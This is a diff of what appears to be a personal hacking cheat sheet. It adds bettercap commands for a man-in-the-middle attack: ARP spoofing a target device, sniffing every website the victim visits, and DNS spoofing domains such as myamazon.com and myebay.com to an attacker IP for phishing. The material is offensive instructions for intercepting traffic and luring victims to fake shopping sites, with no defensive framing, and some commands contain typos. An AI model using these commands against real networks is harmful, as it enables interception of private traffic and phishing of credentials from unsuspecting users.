@@ -554,13 +554,20 @@ set dns.spoof.domains myebay.com [redirects to APACHE config]
 
 set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
 set arp.spoof.fullduplex true [sets attack to victim and  host]
-set arp.spoof.targets 192.168.43.157(IP address of the target Device)
+set arp.spoof.targets 192.victim_ip(IP address of the target Device)
 arp.spoof on
 
 set net.sniff.local true
 net.sniff on
 
-
+--------------------------------------------------- [ARP & SPOOF- Capture + REDIRECT TRAFFIC MITM] --------------------------------------
+[bettercap] --->> This will capure all websies visited by the target. 
+* arp.spoof.targets 192.victim_ip
+* arp.spooof enable forwarding
+* net.sniff on
+----------------[REDIRECT TRAFFIC] ---- (Phishing) 
+* net.sniff off
+* dns.spoof myamazon.com -> 192.attacker_ip
 --------------------------------------------------- FIND IP FROM DOMAIN --------------------------------------
 
 use ping, to see various hops. [will get firewalle] 
